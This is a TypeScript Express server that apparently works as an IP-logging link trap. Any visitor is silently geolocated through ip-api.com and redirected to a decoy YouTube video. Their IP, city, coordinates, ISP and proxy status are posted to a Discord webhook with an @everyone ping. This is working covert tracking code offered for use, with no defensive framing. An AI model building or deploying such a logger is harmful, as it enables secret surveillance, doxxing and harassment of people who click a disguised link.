// External imports
import axios from 'axios';
import morgan from 'morgan';
import express from 'express';
import { createServer } from 'http';
import 'dotenv/config';

// External typings imports
import type { Request, Response } from 'express'

// App
const app = express();
const server = createServer(app);

// App settings
app.set('port', process.env.PORT || 5000);
app.set('json spaces', 2);
app.set('trust proxy', true);

// Middlewares
app.use(morgan('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Colors
var colors = require('colors/safe');

// Telegram
import { Telegraf } from 'telegraf';
const bot = new Telegraf(`${process.env.TELE_TOKEN}`);

bot.launch()

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// Discord
import Discord from 'discord.js';
const intents = new Discord.Intents(32767);
const client = new Discord.Client({ intents });

client.on('ready', () => {
  console.log(colors.blue('[DISCORD]') + ' Logged in as ' + colors.green(`${client.user?.tag ?? 'ERROR'}`));
});

client.login(process.env.DISC_TOKEN);

// Routes
app.get('*', async (req: Request, res: Response): Promise<void> => {
  const ipHeaders = req.headers['x-forwarded-for'] ?? req.connection.remoteAddress ?? '';
  const ipv4 = ipHeaders.toString().replace('::ffff:', '');

  if (ipv4) {
    const url = 'http://ip-api.com/json/' + ipv4 + '?fields=66846719';

    const info = await axios.get(url);
    const data = info.data;
  
    res.redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ');

    // Telegram


    // Discord
    const webhookClient = new Discord.WebhookClient({ url: `${process.env.WH_URL}` });

    const embed = new Discord.MessageEmbed()
    .setTitle('Nueva entrada')
    .addFields(
      { name: 'IP', value: data.query || 'Sin datos', inline: true },
      { name: 'Continente', value: data.continent || 'Sin datos', inline: true },
      { name: 'Código del continente', value: data.continentCode || 'Sin datos', inline: true },
      { name: 'País', value: data.country || 'Sin datos', inline: true },
      { name: 'Código del país', value: data.countryCode || 'Sin datos', inline: true },
      { name: 'Provincia/Estado', value: data.regionName || 'Sin datos', inline: true },
      { name: 'Código de región', value: data.region || 'Sin datos', inline: true },
      { name: 'Ciudad', value: data.city || 'Sin datos', inline: true },
      { name: 'ZIP', value: data.zip || 'Sin datos', inline: true },
      { name: 'Latitud', value: `${data.lat || 'Sin datos'}`, inline: true },
      { name: 'Longitud', value: `${data.lon || 'Sin datos'}`, inline: true },
      { name: 'Zona horaria', value: data.timezone || 'Sin datos', inline: true },
      { name: 'Moneda', value: data.currency || 'Sin datos', inline: true },
      { name: 'ISP', value: data.isp || 'Sin datos', inline: true },
      { name: 'Organización', value: data.org || 'Sin datos', inline: true },
      { name: 'AS', value: data.as || 'Sin datos', inline: true },
      { name: 'Nombre AS', value: data.asname || 'Sin datos', inline: true },
      { name: 'Reversa', value: data.reverse || 'Sin datos', inline: true },
      { name: '¿Movíl?', value: `${data.mobile || 'Sin datos'}`, inline: true },
      { name: '¿Proxy?', value: `${data.mobile || 'Sin datos'}`, inline: true },
      { name: '¿Hosting?', value: `${data.hosting || 'Sin datos'}`, inline: true }
    )
    .setColor('#ff1616')
    
    webhookClient.send({ content: '@everyone', embeds: [embed] });
  }
});

// Start server
server.listen(app.get('port'), (): void => {
	console.log(colors.red('[SERVER]') + ' Server listening on port ' + colors.green(app.get('port')));
});

process.on('unhandledRejection', error => {
  console.error(error)
});